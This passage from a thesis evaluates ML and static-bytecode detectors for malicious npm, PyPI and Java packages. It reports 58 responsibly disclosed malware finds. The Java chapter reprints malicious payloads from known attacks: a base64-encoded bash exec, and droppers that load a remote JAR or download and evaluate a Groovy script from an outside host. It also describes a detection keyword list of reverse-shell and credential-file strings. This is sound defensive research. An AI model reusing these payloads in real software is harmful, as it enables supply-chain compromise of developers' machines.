In the case of npm, the mono-language model has 419 unique false positives w.r.t. the cross-language model (cf. Figure 7.4a). The number of unique false positives found by the cross-language model is 275. In terms of true positives, both models correctly classify the same 37 packages as malicious (cf. Figure 7.4c). However, the mono-language model identifies an additional malicious package. In terms of precision, the cross-language model shows slightly better performance compared to the mono-language model. Overall, we manually reviewed 1,530 packages over 10 days (i.e., 153 packages/day). 

For PyPI, the mono-language model classifies as malicious 231 more packages than the cross-language model. Of these packages, 228 are false positives (cf. Figure 7.4b), and 3 are true positives that the cross-language model missed (cf. Figure 7.4d). Also in the case of PyPI, the cross-language model has better precision than the mono-language model (4.4% over 3.1%, cf. Table 7.6 column "Pr."). Overall, we manually reviewed 631 packages over 10 days (i.e., 63 packages/day). 

> 7. https://warehouse.pypa.io/api-reference/xml-rpc.html 

> 8. https://libraries.io 

122 

_7.4. Discussion_ 

**==> picture [433 x 75] intentionally omitted <==**

**----- Start of picture text -----**<br>
Key Logger Dropper Data Exfiltration<br>Reverse Shell Rickrolling Attack Research PoC<br>PyPI 2 6 6 5 1<br>npm 3 27 1 3 4<br>**----- End of picture text -----**<br>


– Figure 7.5 Types of malicious behavior among the 58 findings between npm and PyPI. 

Though the cross-language model does not drastically improve the precision compared to the mono-language models, the difference in terms of manual effort is non-negligible as the number of false positives considerably decreases without a major loss in terms of true positives. 

All the malicious packages (true positives) found in npm (38 in total) and PyPI (20 in total) have been reported to the respective security teams following the official channels (cf. Section 7.4). As a result of our reporting, after triaging by the respective npm and PyPI security teams, the 58 reported malicious packages have been removed from the repositories and are no longer available for download. As we believe in the importance of maintaining (for research purposes) a database of malicious packages related to OSS supply chain attacks, we contributed to BKC by uploading the detected malicious packages. 

## **Response to RQ4.2** 

By classifying packages daily uploaded to npm and PyPI within a period of 10 days we found that the cross-language model achieves better precision than the mono-language models. In total, we find 58 previously unknown malicious packages (38 for npm and 20 for PyPI). 

## **7.4 Discussion** 

In this section, we describe the characteristics of the malicious packages found in npm and PyPI. We report some remarks on the two ecosystems observed while inspecting the false positives. Finally, we highlight notable differences in terms of features between malicious true positives, false positives, and packages flagged as benign. 

123 

Chapter 7 – _Contribution 4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python_ 

**Malware types.** Figure 7.5 depicts the types of malicious behaviors found in both npm and PyPI during our real-world experiment (cf. Section 7.3). 

The majority of malicious packages both in npm and PyPI aim at achieving data exfiltration (27 and 6 packages respectively) and the most common exfiltrated information consists of public IP address and environment variables. Other common malicious behaviors that we observed involve the opening of a reverse shell and the download and execution of malicious code (i.e., dropper). The latter is commonly achieved by making an HTTP(S) request to download and execute a second-stage payload. In a malicious discovery within npm, we identified a novel tactic (in comparison to those in the BKC). This tactic involves placing the second-stage payload within the TXT field of a DNS response, under the control of the attacker. Subsequently, a request to this DNS is initiated through a third-party service (i.e., Google’s DNS resolver). In this way, the attacker is less likely to have the request from the victim blocked by any firewall. 

In npm, we found also research proofs-of-concept, i.e., the attacker aims at achieving execution to demonstrate the potential risks when installing their package. One notable example is a package containing code obfuscated with AES-256 encryption, which is decrypted at runtime. Upon execution, the code creates a new file on the victim’s machine containing a warning message about the potential harm. Furthermore, we identified 4 packages (3 in npm and 1 in PyPI) conducting a Rickrolling attack at installation time (i.e., starting the reproduction of the song _Never Gonna Give You Up_ from Rick Astley). When we reported these, the respective security teams decided not to remove the said packages as they did not consider Rickrolling as violating their term of service. 

Although this behavior was not part of the ones available in the training dataset (cf. Section 7.1), our approach identified two keyloggers in PyPI. 

**Malware campaigns.** During the analysis of daily uploaded packages to npm and PyPI, we observed the presence of several malware campaigns. Additionally, we consider variations of the malicious code that only differ in the subdomain of the URLs. 

In the case of npm, we detected 7 campaigns of which the largest includes 12 packages. Only in one campaign the attacker experiment with different ways to achieve code execution, while in all the other cases both the malicious code and the way of triggering its execution are the same. In the case of PyPI, we detected 5 campaigns of which the largest includes 4 packages. 

It is worth mentioning that we have detected a case of a cross-language campaign, meaning that the same malicious behavior was present in both npm and PyPI. This finding 

124 

_7.4. Discussion_ 

suggests that attackers may spread their malicious activities across multiple ecosystems in order to increase their chances of success. 

**Malicious code obfuscation.** The majority of malicious packages found both in npm and PyPI during our experiment do not obfuscate the malicious code. Among the 38 malicious packages from npm, only 2 obfuscate the code using AES encryption, and 2 packages use custom obfuscation (e.g., renaming sensitive functions like exec in human-unreadable ways). Among the 20 malicious packages found in PyPI, 3 use simple obfuscation techniques (e.g., encoding the source code in bytes, base64, rot13) and 3 other packages employ custom obfuscation. 

**Analysis of false positives.** The majority of false positives in both npm and PyPI consist of small packages (often containing only _package.json_ or _setup.py_ ) with almost no functionality (e.g. print of "hello world" or sum of numbers). Possible use cases of such packages are to reserve names (e.g., future projects, prevent typosquatting) in the package repository or to test the upload of packages. 

We also observe the concept of campaign (i.e., packages with the same behavior) for some non-malicious packages. A curious case observed in npm is about a set of packages whose sole purpose is to use the _give-me-a-joke_ project as a dependency, probably with the aim of increasing its popularity. Another interesting finding is about a package containing nothing but the CV of its creator. 

In 4 packages (3 in npm and 1 in PyPI) we detect the presence of obfuscated code. Since we could not observe obvious malicious behaviors we flagged these as false positives. 

Finally, we acknowledge that the number of false positives (cf. Table 7.6) clearly needs further improvement, although they are still manageable for a manual review, especially considering that the majority of them were small in size. 

**Comparison on features.** While 81% of the malicious packages found in npm (true positives) make use of installation hooks, only 8% and 2% make use of them among the false positives and the packages flagged as benign, respectively. Also in the case of PyPI, the majority of true positives (i.e., 58%) make use of installation hooks, while it is less common in the case of false positives and packages flagged as benign (i.e., 5% and 1%, respectively). Another aspect concerns the presence of Markdown files: only a minority of true positives (i.e., 25% for npm and 42% for PyPI) contain at least one _.md_ file, whereas most of the packages flagged as benign contain such files (82% for npm and 79% for PyPI). 

**Cross-language vs. Mono-language models.** As observed in the real-world evaluation (cf. Section 7.3), the cross-language model exhibits greater precision compared 

125 

Chapter 7 – _Contribution 4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python_ 

to the mono-language models. To delve into the rationale behind this, we explored the relationship between feature importance across models and the traits of the malicious packages identified by each model. 

The usage of installation hooks and the count of Markdown files rank within the most influential features for the mono-language model of npm, whereas they hold less significance for the mono-language model of PyPI. When merging npm and PyPI samples to train the cross-language model, the importance of these features reemerges. Considering that a substantial portion of true positives in PyPI use installation hooks or lack Markdown files, this characteristic likely contributes to the improvement of the crosslanguage model’s performance compared to the mono-language model specifically designed for PyPI. 

Features associated with the size of source code files (e.g., _number of lines_ ) and the count of homogeneous strings in source code files (cf. Section 7.1) rank within the most influential features for the mono-language model of PyPI, whereas they hold less significance for the mono-language model of npm. Merging npm and PyPI samples to train the cross-language model, the importance of these features reemerges. Given that several false positives in npm lack script files and consist solely of the _package.json_ , this characteristic is likely a contributing factor in augmenting the cross-language model’s precision compared to the mono-language model for npm. 

**Porting to other languages.** In our work, we explored the feasibility of detecting malicious packages across multiple ecosystems. As a preliminary analysis, we focused on the case of npm and PyPI. To achieve this, we defined a set of features that are not specific to npm or PyPI, making it feasible to port our approach to other ecosystems. The only feature required during porting is that the target ecosystem supports the use of install hooks, which is also one of the most important features for the trained models. Examples of ecosystems that support this functionality include Composer for PHP [193] and Gem for Ruby (by extending the definition of ’usage of installation hook(s)’ to include the usage of extensions by gems [197]). 

## **Responsible Disclosure** 

npm and PyPI have two different ways of officially reporting malicious packages. 

In npm, reporting is done via the UI of the official website: the user has to search for the package to be reported, navigate to the project page, click on the ’Report Malware’ button, and finally fill in the report form. This procedure can make it difficult to report multiple 

126 

_7.5. Threats to Validity_ 

malwares at the same time (especially since malware campaigns are common). Moreover, multiple reports at the same time enable CAPTCHA tests. All 38 malicious packages found during our analysis have been responsibly reported to the security team according to the abovementioned procedure. Except for the packages conducting a Rickrolling attack (whose behavior was not considered a violation of npm’s terms of use), they have been removed from the package repository. 

In PyPI, the official procedure to report malicious packages consists of sending an e-mail to the security team[9] with the names of the packages and (preferably) the link to the lines of code containing the malware highlighted using _Inspector_[10] . Also in this case, we responsibly reported the 20 malicious packages found during our analysis. Following the triaging procedure, the PyPI security team confirmed our findings and removed them from the package repository. 

## **7.5 Threats to Validity** 

Though the results obtained in evaluating our cross-language approach are promising, there are some threats to validity worth highlighting. 

Both the mono-language and cross-language models have been trained on previously known malicious samples from BKC [60]. This has introduced a bias on the type of malware identifiable through our classification (cf. Section 7.1), and a limitation of the approach is the difficulty of finding new (unseen) types of malware. Furthermore, attackers could potentially evade detection by carefully constructing malicious packages so that the values of their features (cf. Section 7.1) mimic the distribution seen in benign packages. 

In the real-world experiment, we do not manually review (due to their large number) the packages flagged as benign by our classifiers to check the presence of false negatives so we cannot draw conclusions in terms of recall. Nevertheless, during our analysis, we learned from the news [220] about the discovery of 12 malicious packages uploaded to PyPI in the same period of our experiment. By inspecting these cases we observed that none of them were flagged as malicious by our classifiers (both mono-language and crosslanguage). The peculiarity of these missed packages - compared to those known from BKC - is that they are clones of benign packages (thus containing largely benign code) into which a line of malicious code has been injected. 

> 9. `https://pypi.org/security/` 

> 10. `https://inspector.pypi.io` 

127 

Chapter 7 – _Contribution 4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python_ 

As described in Section 7.4, in the manual analysis of packages collected in the wild and flagged as malicious, we encountered some suspicious packages heavily obfuscated, that we marked as false positives as we were not able to identify malicious behavior. However, a deeper analysis could reveal malicious intent and thus we could have misattributed some false positives. 

As mentioned in Section 7.1, since there is no ground truth for benign packages in npm and PyPI, we made some assumptions and did our best effort to check that the benign samples in our dataset do not include malicious code. However, we cannot exclude that some packages considered benign may be hiding malicious code and thus the corresponding label in our dataset would be wrong. 

Related to the imbalance problem, there is no certainty about the actual ratio of benevolent to malevolent packages in package repositories. In our work, we assume a ratio of 90% benign samples and 10% malicious ones as suggested in [214], [215], but other options have been proposed, e.g., 1% of malicious packages in [72]. As we did not conduct experiments on changing such ratios, we cannot evaluate the impact of different ratios on our classification. 

In our work, we evaluate mono-language and cross-language models. However, both are trained using language-independent features, thus the results may differ with monolanguage models trained on language-specific features. We consider our approach complementary to those using language-specific features: we cope with the scarcity of samples to increase the set of known malicious samples, required for language-specific approaches. 

## **7.6 Conclusion** 

In this section, we evaluated the application of machine learning in the domains of JavaScript (npm) and Python (PyPI) to detect malicious packages. Our primary aim was to determine the feasibility of training a unified model capable of identifying malicious packages in both ecosystems. Our empirical analysis involved scanning daily uploaded packages in both npm and PyPI using our classifier, which successfully detected and promptly reported 58 previously unknown malware instances. This exploration indicates the potential for cross-language detection to enhance the identification and prevention of OSS supply chain attacks. 

In the following chapter, we shift our focus from detecting malicious packages in interpreted languages to exploring detection in the context of Java packages. 

128 

Chapter 8 

## **- CONTRIBUTION 5 EVALUATION OF STATIC APPROACH TO THE DETECTION OF MALICIOUS PACKAGES IN JAVA** 

## **Summary** 

**Problem Addressed:** P4 - Automate Detection 

**Key Contribution(s):** Proposal of static approach for detecting malicious behaviour in Java bytecode, taking advantage of a combination of indicators (e.g., the presence of suspicious strings, calls to sensitive APIs). Efficacy of approach tested by conducting a controlled experiment. **Contribution Type:** Preventing 

**Point of view:** Defender 

**Associated Publication(s):** See reference [6] **Scope:** 

**==> picture [212 x 101] intentionally omitted <==**

**----- Start of picture text -----**<br>
ATTACKER<br>1. Make the  2. Make the victim  3. Make the victim<br>malicious OSS  download the  execute the<br>package available malicious OSS  malicious code in<br>package the OSS package<br>DEFENDER<br>Detect malicious package<br>before download or<br>execution<br>**----- End of picture text -----**<br>


Most of the works focused on the detection of malicious OSS packages contained in package repositories (cf., Section 2.2.2) tackle interpreted languages (e.g., JavaScript, Python), whereas the Java ecosystem is less explored despite its popularity [86], [87]. 

Based on the study of real-world attacks, our goal is to find and evaluate simple-yeteffective indicators of malicious behavior in Java packages that can help in filtering out the non-malicious ones. Indicators of malicious behavior can be used by package repositories vetting the submitted packages or by downstream users checking the downloaded dependencies. 

129 

Chapter 8 – _Contribution 5 - Evaluation of Static Approach to the Detection of Malicious Packages in Java_ 

Since the usual way of consuming such packages is through pre-compiled JARs, we focus on Java bytecode. In Just-In-Time (JIT) compilation, the Java source code is compiled into a _class_ file, which contains a platform-independent intermediate representation that is transformed into machine code by the JVM. Each bytecode instruction consists of a one-byte opcode followed by zero or more bytes for the operands [221]. When the operands are constants, they are represented by symbolic information contained in the constant pool. The latter act as a symbol table and each element is characterized by index, type, and value. Constant pool entries of type `Utf8` hold constant string values. Constants with types such as `String` , `Class` , or `MethodRef` contain instead the index value pointing to the associated `Utf8` entry. 

Constant pool: ... Resolves to: #22 = String #23 bash -c {echo,Y3V...i5wbmc7Cg==}|{base64,-d}|{bash,-i} #23 = Utf8 bash -c {echo,Y3V...i5wbmc7Cg==}|{base64,-d}|{bash,-i} ... Resolves to: #25 = NameAndType #26:#27 exec:(Ljava/lang/String;)Ljava/lang/Process; #26 = Utf8 exec #27 = Utf8 (Ljava/lang/String;)Ljava/lang/Process; 

– Figure 8.1 Indexing mechanism in the constant pool. 

In this contribution, we set out to answer the following research questions: 

**RQ5.1** – What are possible simple and effective indicators of malicious behavior that can be observed from the bytecode? 

– **RQ5.2** How do these indicators and their combinations perform in the detection of malicious Java packages? 

To answer those questions we analyze both the constant pool (e.g., to detect obfuscated strings) and bytecode instructions (e.g., to detect sensitive APIs). We assess the performance of the identified indicators by analyzing the Top-10 Java projects from libraries.io[1] , both the original, benign ones as well as infected ones, containing malicious payloads taken from three real-world attacks. 

1. `https://libraries.io/` 

130 

_8.1. Methodology_ 

|**Classes**<br>Reverse Shell<br>Dropper<br>Data Exfltration<br>DoS<br>Financial Gain|**Behaviors**<br>**Execution**<br>**Connection**<br>**File Input**<br>**File Output**<br>**Read Environment**|
|---|---|
|||



– Table 8.1 Behaviors required by malwares in our scope to achieve their primary objectives. 

## **8.1 Methodology** 

In order to answer RQ5.1, and so to find relevant indicators of malicious JARs, we start by inspecting the four Java samples from the BKC [27]. Two of them are different versions of the same package, and their malicious payload is identical. Because of the scarcity of malware samples in Java, we also analyzed some examples written in other programming languages and ported their code to Java. 

We observe that the strings contained in the malwares may contain shell commands, URLs, or paths to sensitive files either in an encoded format (e.g., base64) or unencoded. 

The inspection of the Java samples and ported versions from other languages also allowed us to collect some of the Java APIs required to implement the malicious functionalities. We augment such a list by searching in the Java SE documentation [222] for similar APIs to accomplish the same tasks. We categorize the sensitive APIs according to the behaviors (cf. Table 8.1) used by the malware types described in Section 1.2. The entire list of Java APIs is available in Table 8.2. 

We also observe that in many samples the malicious code is included in a single method and usually within a try block associated with an empty catch. This suggested implementing an intra-procedural data-flow analysis and looking for such try-catch blocks. 

Figure 8.2 depicts the approach designed for statically analyse malicious JARs. 

To answer RQ5.2, we conduct a controlled experiment, depicted in Figure 8.3. We select the Top-10 most popular projects from libraries.io, which at the time of writing (July 2022) are: `junit` , `guava` , `h2database` , `spring-test` , `spring-context` , `spring-core` , `spring-orm` , `gson` , `mockito-core` , and `lombok` . 

We artificially created infected versions of the latest version of each project as follows. We convert the three malicious Java code excerpts (payloads) from BKC in bytecode using ASMifier [223]. We refer to Listing 8.1 as Payload 1 (P1), Listing 8.2 as Payload 2 (P2), 

131 

Chapter 8 – _Contribution 5 - Evaluation of Static Approach to the Detection of Malicious Packages in Java_ 

|**API Type**|**Class**|**Method/Constructor**|**Method/Constructor**|
|---|---|---|---|
|**Execution**|Runtime|exec||
||ProcessBuilder|ProcessBuilder, command, start||
||System|load, loadLibrary||
||Desktop|open||
||JShell|eval||
||ScriptEngine|eval||
|**Encoding**|Base64$Decoder|decode||
|**and Cryptography**|Base64$Encoder|encode, encodeToString||
|**Connection**|Socket|Socket, getInputStream, getOutputStream||
||URL|URL, openConnection, openStream||
||URI|URI, create||
||URLConnection|getInputStream||
||HttpRequest$Builder|GET, POST||
|**Dynamic**|URLClassLoader|URLClassLoader||
|**Programming**|ClassLoader|loadClass||
||Class|forName,<br>getDeclaredMethod,||
|||getDeclaredField, newInstance||
||Method|invoke||
||Introspector|getBeanInfo||
|**Environment**|System|getProperty, getProperties, getEnv||
|**Reading**|InetAddress|getHostName||
|**File Output**|FileOutputStream|FileOutputStream, write||
||File|File||
||Files|newBuferedWriter, newOutput-||
|||Stream, write, writeString, copy||
||FileWriter|write||
||BuferedWriter|write||
||RandomAccessFile|write||
|**File Input**|FileInputStream|FileInputStream, read||
||Files|newInputStream,|newBufere-|
|||dReader, readAllBytes, readAl-||
|||lLines, copy||
||FileReader|read||
||Scanner|Scanner||
||BuferedReader|read||
||RandomAccessFile|read, readFully||



Table 8.2 – List of sensitive APIs offered natively by Java and that are used by malwares. 

132 

_8.1. Methodology_ 

**==> picture [432 x 92] intentionally omitted <==**

**----- Start of picture text -----**<br>
Entropy Analysis<br>Package Repository<br>Constant Pool String Extraction Language-Based Filtering<br>Sensitive Strings<br>Download<br>Sensitive APIs<br>List of PURLs JAR Class files Bytecode Instructions Empty Catch Clauses<br>Data-Flow Analysis<br>**----- End of picture text -----**<br>


– Figure 8.2 Description of the static analysis of a JAR for the detection of malicious bytecode. 

and Listing 8.3 as Payload 3 (P3). Then, we extract the JARs of the benign packages, randomly select a class file, add the payload via bytecode injection at the beginning of the first available method in the class, and re-create the archives. Therefore the final set of packages consists of 40 JARs: the 10 Original versions (O) and the 30 versions infected with P1, P2, and P3 respectively. 

P1 uses an execution API to run a bash command that decodes a base64 string and executes its content. This payload is placed in a try block associated with an empty catch. 

P2 uses reflection to dynamically invoke the content of a malicious class that is hosted and read directly from the internet. This payload does not have an empty catch clause. 

P3 downloads a Groovy script, stores it in a local file, and executes its content. Similarly to P1, also P3 is placed in a try block associated with an empty catch clause. 

The original JARs and the infected ones are analyzed as described in the following section. The "JAR scanner" component in Figure 8.3 applies the analyses described in Figure 8.2. 

**==> picture [454 x 100] intentionally omitted <==**

**----- Start of picture text -----**<br>
Injection of 3<br>JAR<br>Payloads<br>Scanner<br>30<br>Top-10 Projects  Infected Versions 10 Reports<br>from libraries.io<br>**----- End of picture text -----**<br>


– Figure 8.3 Experiment to assess the analysis of malicious Java bytecode. 

– Listing 8.1 Malicious code snippet from _HttpServlet.java_ contained in _com.github.codingandcoding:servlet-api@3.2.0_ 

1 `protected void doGet( HttpServletRequest req)` 

133 

Chapter 8 – _Contribution 5 - Evaluation of Static Approach to the Detection of Malicious Packages in Java_ 

2 `throws ServletException , IOException {` 3 `Runtime.getRuntime ()` 4 `.exec( "bash -c {echo ,YmFz ** SHORTENED **JjE=}` 5 `|{base64 ,-d}|{bash ,-i}" );` 6 `}` 

– Listing 8.2 Malicious code snippet from _CompilerMojo.java_ contained in _com.github.codingandcoding:maven-compiler-plugin@3.9.0_ 

1 `public void execute ()` 2 `throws MojoExecutionException , CompilationFailureException` 

3 `{` 

4 `URLClassLoader loader = (URLClassLoader ) ClassLoader. getSystemClassLoader ();` 5 `Class urlclassloaderClass = URLClassLoader. class ;` 6 `URL url = null ;` 7 `try` 8 `{` 9 `url = new URL( "http :// swmail.malware.index/evilmaven.jar" );` 10 `Method m = urlclassloaderClass . getDeclaredMethod ( "addURL" , new Class []{ URL. class } );` 11 `m. setAccessible( true );` 12 `m.invoke( loader , new Object []{ url} );` 13 `Class.forName( "com.swmail.hac.Main" , true , loader );` 14 `}` 15 `catch ( Exception e )` 16 `{` 17 `e. printStackTrace ();` 18 `}` 19 `// Continues` 20 `}` 

– Listing 8.3 Malicious code snippet from _CompilerMojo.java_ contained in _com.github.codingandcoding:maven-compiler-plugin@3.9.0_ 

1 `public final void send () {` 2 `try {` 3 `Binding binding = new Binding ();` 4 `GroovyShell shell = new GroovyShell(binding);` 5 `int bytesum = 0;` 6 `int byteread = 0;` 7 `try {` 

134 

_8.2. Indicators of Malicious Bytecode_ 

8 `URL url = new URL( "http ://112.11.168.47/ evil.groovy" );` 9 `URLConnection conn = url. openConnection ();` 10 `InputStream inStream = conn. getInputStream ();` 11 `FileOutputStream fs = new FileOutputStream ( "/tmp/evil.groovy` 

```
");
```

12 `byte [] buffer = new byte [1024];` 13 `int length;` 14 `String getShell = "" ;` 15 `while (( byteread = inStream.read(buffer)) != -1) {` 16 `bytesum += byteread;` 17 `fs.write(buffer , 0, byteread);` 18 `getShell += new String(buffer);` 19 `}` 20 `Object value = shell.evaluate(getShell);` 21 `System.out.println(value.toString ());` 22 `} catch (Exception e) {` 23 `}` 24 `}` 25 `// Continues` 26 `}` 

## **8.2 Indicators of Malicious Bytecode** 

This section presents the indicators for the detection of malicious code at the bytecode level (Figure 8.2). 

## **Constant Pool Analysis** 

Since malwares can contain hardcoded strings, the extraction and analysis of strings is a common practice in malware analysis to obtain evidence about malicious behavior [59]. 

In our work, we extract strings from the constant pool of each class composing the analyzed JAR using the indexing mechanism depicted in Figure 8.1. In the following we present different approaches to detect suspicious strings, highlighting their benefits and limitations. 

135 

Chapter 8 – _Contribution 5 - Evaluation of Static Approach to the Detection of Malicious Packages in Java_ 

## **Entropy Analysis** 

In information theory, entropy measures the average level of information associated with the possible outcomes of a random variable [224]. 

To detect the presence of obfuscation (e.g., base64) we measure the Shannon entropy of each string (independent of one another). In fact, obfuscated strings usually have higher entropy than their unencoded counterpart due to their higher variability. For example, `bash` has an entropy value of 2, while its base64 encoding (i.e., `YmFzaA==` ) has a value of 2.75. However, short strings and small alphabets (e.g., base16), due to their low variability, could lead the Shannon entropy approach to fail in identifying malicious strings. 

Since the constant pool often contains log messages for the user, usually in English, we also consider a filtering mechanism based on a measure of relative entropy, such as the Kullbac-Leibler divergence [225]. The latter measures the distance between two probability distributions. In our context, we measure the distance between the probability distribution of the characters of a supplied string and the one of the characters in the English language. This approach is limited to detect phrases in English and, additionally, URLs containing English words (e.g., domain names) would be filtered out because they have a probability distribution similar to the one of the English language. 

## **Language-Based Filtering** 

To solve the problem of filtering out strings that resemble sentences we also consider a probabilistic detection of the language by using the Compact Language Detector (CLD2) [226]. The main benefit of this approach, compared to the one based on the relative entropy described above, is that in this case, we would also remove output messages in languages other than English. 

Before checking the detection value of a given string, we make it lower case, tokenize it with NLTK[2] , and remove all the non-alphanumerical characters and the duplicates. Two examples are provided in Listing 8.4. 

– Listing 8.4 Example of pre-processing of a string before applying the Kullbac-Leibler filter or the language detection as described in Section 8.2 

1 `s1 = "http :// swmail.malware.index/evilmaven.jar"` 

> 2 `list1 = word_tokenize(s1)` 

> 3 `# Output: [" http", ":", "// swmail.malware.index/evilmaven.jar"]` 

> 2. `https://www.nltk.org/` 

136 

_8.2. Indicators of Malicious Bytecode_ 

4 `list1 = remove_symbols_from_words (list1)` 5 `# Output: [" http", "", " swmailmalwareindexevilmavenjar "]` 6 `s1 = reassemble_words (list1)` 7 `# Output: "http swmailmalwareindexevilmavenjar "` 8 `cld2.detect(s1)` 9 `# Output: Reliable: False , Details: (’Unknown ’, ’un ’, 0, 0.0)` 

10 11 `s2 = "array lengths differed , expected.length="` 12 `list2 = word_tokenize(s2)` 13 `# Output: [" array", "lengths", "differed", ",", "expected.length ="]` 14 `list2 = remove_symbols_from_words (list2)` 15 `# Output: [" array", "lengths", "differed", "", " expectedlength "]` 16 `s2 = reassemble_words (list2)` 17 `# Output: "array lengths differed expectedlength"` 18 `cld2.detect(s2)` 19 `# Output: Reliable: True , Details: (’ENGLISH ’, ’en ’, 97, 1293.0)` 

20 

If a language is detected, then the string is filtered out. Thus, we consider suspicious those where the language detection failed. 

## **Sensitive Keywords** 

From the inspection of the BKC we observe that many payloads contain keywords related to bash commands (e.g., `bash` ) or sensitive files (e.g., `.bash_history` , `.ssh` ) [27]. Those are strong indicators of malicious behavior. 

To detect such keywords we have built an extensive list from offensive security cheat sheets [227], [228]. It covers the most popular ways of creating reverse shells, e.g., via bash, netcat, python, or perl. Regarding data exfiltration, it also covers common directories used when testing for Local File Inclusion (LFI) vulnerabilities, e.g., `/etc/passwd` . Also included are popular domains used for IP lookups (e.g., whatismyip.org), and the keywords `https://` and `http://` to detect URLs. 

The entire corpus of 178 keywords is stored in unencoded format, in different encodings (base64, base32, base16, a85, b85, rot-13, uuencode and url-encoding), and in reverse order (e.g., `hsab` for `bash` ). When analyzing given JARs, we search for the presence of those keywords in constant pool strings. 

137 

Chapter 8 – _Contribution 5 - Evaluation of Static Approach to the Detection of Malicious Packages in Java_ 

## **Bytecode Instructions Analysis** 

The analysis of bytecode instructions aims at collecting pieces of evidence of malicious behavior from the operations of a Java program. 

## **Sensitive APIs** 

As described in Section 4.1, malwares in the context of OSS supply chain attacks require execution, networking, file I/O, and the read of environmental information to achieve their goal. Using the list of sensitive Java APIs related to these behaviors (cf. Table 8.2), we inspect the bytecode instructions to detect their invocation (e.g., via `invokespecial` or `invokevirtual` ). In our analysis we only consider native Java APIs to evaluate if this is sufficient to detect the malicious samples. 

_Execution APIs_ provide the ability to run shell commands or to evaluate scripts, possibly in other languages than Java [229]. These APIs potentially allow any shell command to be executed. Therefore, an attacker can achieve any malicious behavior through these methods as long as the specified payload is compatible with the system executing it. 

_Connection APIs_ provide networking capabilities. They allow the creation of sockets and the redirection of inputs and outputs in the case of a reverse shell. Droppers need also to connect to remote servers to download second-stage payloads. A connection is also required for data exfiltration to send the stolen information to the attacker. 

_Dynamic Programming APIs_ leverage Java reflection [230] to load classes and execute their methods at runtime. From the perspective of droppers, an attacker can host a malicious class remotely and have the victim use it via reflection. Reflection makes it harder for the static analyzer to detect the presence of critical APIs. 

_Encoding and Cryptographic APIs_ can be used to obfuscate code to evade detection by AVs. Nearly half of the samples of the BKC use this technique, the most common encoding being Base64 [27]. 

_Evironment Reading APIs_ are relevant in the case of data exfiltration, e.g., to read environment variables, user name, or hostname. 

## **Empty Catch Clauses** 

Most API calls listed in Table 8.2 throw exceptions to the runtime system [231]. 

To not alert the victim with a message in case of error or halt program execution altogether, malware developers often include the malicious code within a try block associated 

138 

_8.3. Experiment_ 

with an empty catch block (cf. Listing 8.3). 

Therefore, for each class, we report all the empty catch blocks and in which method they are present. We then scan the instructions of the corresponding try block to search for the presence of sensitive API calls. 

## **Data Flow Analysis** 

To increase the confidence in detecting malicious JARs, we complement the detection of sensitive APIs with data flow analysis. The goal is to detect cases where malicious payloads flow into sensitive APIs. We carry out an _intra-procedural analysis_ (implemented with ASM [232]) by interpreting the instructions and by simulating the JVM stack. Once we reach the sensitive API we check the top of the stack to extract the value of the payload. 

## **Response to RQ5.1** 

We consider the following indicators as relevant from a security perspective. **Constant pool** : the presence of high-entropy strings, sensitive keywords (e.g., shell commands), and strings for which no language can be determined. **Bytecode instructions** : the presence of sensitive APIs (execution, networking, file i/o, environment reading, dynamic programming, and encoding/cryptographic), especially in combination with empty catch clauses and the use of string literals defined in the same respective method. 

## **8.3 Experiment** 

In this section, we describe the experiment to assess the effectiveness of the simple indicators described in Section 8.2 for the detection of malicious Java bytecode. In particular, we evaluate the capabilities of those indicators and their combination to recognize malicious JARs. 

## **Constant Pool** 

We evaluate the efficiency of different combinations of filtering methods (cf. Section 8.2) and Table 8.3 shows the average results for all the infected packages. 

First, we evaluate the removal of strings that are recognized as sentences by the language detector (cf. column **LC** ). Secondly, we evaluate the removal of strings characterized 

139 

Chapter 8 – _Contribution 5 - Evaluation of Static Approach to the Detection of Malicious Packages in Java_ 

|**PS**<br>P1:<br>1<br>P2:<br>3<br>P3:<br>2|**LC**<br>**P**<br>**R**<br>**bA**<br>.003<br>1.0<br>.738<br>.006<br>.667<br>.572<br>.006<br>1.0<br>.738|**SH**_J_<br>**P**<br>**R**<br>**bA**<br>.005<br>1.0<br>.847<br>.004<br>.30<br>.525<br>.004<br>0.45<br>.571|**SH**_C_<br>**P**<br>**R**<br>**bA**<br>.013<br>1.0<br>.933<br>.013<br>.333<br>.559<br>.013<br>.5<br>.683|**SH**_C_**+KL**2<br>**P**<br>**R**<br>**bA**<br>.239<br>1.0<br>.996<br>**0.0**<br>**0.0**<br>**.498**<br>.239<br>.5<br>.746|**SH**_C_**+KL**10<br>**P**<br>**R**<br>**bA**<br>**.453**<br>**1.0**<br>**.998**<br>**0.0**<br>**0.0**<br>**.498**<br>**.453**<br>**0.5**<br>**.749**|**SH**_C_**+LC**<br>**P**<br>**R**<br>**bA**|
|---|---|---|---|---|---|---|
|||||||.157<br>1.0<br>.989<br>**.157**<br>**.333**<br>**.662**<br>.157<br>.5<br>.739|



– Table 8.3 Average results of different filtering mechanisms applied to strings in the constant pool. In red are the worse results; in bold are the best ones. **PS** : number of strings introduced by the malicious payload. For each filtering mechanism we present the precision ( **P** ), recall ( **R** ), and balanced accuracy ( **bA** ). **LC** : language detection applied to all strings. **SH** : filter based on Shannon entropy at JAR (SH _J_ ) and class (SH _C_ ) level. **SH+KL** : Shannon-based filter combined with Kullbac-Leibler divergence using thresholds of 2 and 10. **SH+LC** : Shannon-based filter combined with language detection. 

by a Shannon entropy below the third quartile computed in two cases: at JAR and the class level (cf. columns **SH** _J_ and **SH** _C_ , resp.). On the total of 30 infected packages, we observe that filtering at the class level performs better than at the JAR level: **SH** _J_ globally shows lower precision, recall, and accuracy than **SH** _C_ . Finally, we combine **SH** _C_ and **LC** with two methods for the removal of output messages: the one based on Kullbac-Leibler divergence (using thresholds of 2 and 10) and the other based on language detection. 

For P1 and P3, the Shannon-based filter at the class level associated with KullbacLeibler using a threshold of 10 (cf. column **SH** _C_ **+KL** 10) reduces most strings without removing those belonging to the malicious injection. However, the filter based on relative entropy misses the significant strings of P2 (i.e., the URL). This happens because the probability distribution of an URL containing a domain (e.g., `swmail.malware.index` ) rather than an IP address is comparable with the one of English characters. Therefore, the best trade-off between precision, recall, and accuracy is offered by the Shannon filter at the class level combined with language detection (cf. column **SH** _C_ **+LC** ) and is adopted in the subsequent analysis. 

